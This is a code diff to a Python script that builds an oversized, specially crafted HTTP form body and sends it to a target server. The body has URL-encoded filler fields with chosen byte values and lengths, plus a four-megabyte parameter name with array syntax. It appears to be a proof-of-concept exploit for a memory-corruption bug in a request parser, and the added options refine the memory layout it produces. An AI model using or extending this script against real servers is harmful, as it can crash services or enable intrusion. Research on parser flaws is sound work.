@@ -14,11 +14,18 @@ def main() -> int:
     ap.add_argument("--name-len", type=int, default=4 * 1024 * 1024)
     ap.add_argument("--fill-len", type=int, default=276)
     ap.add_argument("--fill-byte", default="41")
+    ap.add_argument("--fill-fields", type=int, default=1)
+    ap.add_argument("--tail-len", type=int, default=0)
+    ap.add_argument("--tail-byte", default="43")
     args = ap.parse_args()
 
     fill = bytes([int(args.fill_byte, 16)]) * args.fill_len
     encoded = b"".join(b"%%%02X" % b for b in fill)
-    src = b"=" + encoded + b"&a=1&" + b"L" * args.name_len + b"[x]=1"
+    fields = [b"=" + encoded for _ in range(args.fill_fields)]
+    if args.tail_len:
+        tail = bytes([int(args.tail_byte, 16)]) * args.tail_len
+        fields.append(b"=" + b"".join(b"%%%02X" % b for b in tail))
+    src = b"&".join(fields) + b"&a=1&" + b"L" * args.name_len + b"[x]=1"
     print(f"body={len(src)} name_len={args.name_len} fill_len={len(fill)}")
 
     conn = http.client.HTTPConnection(args.host, args.port, timeout=60)
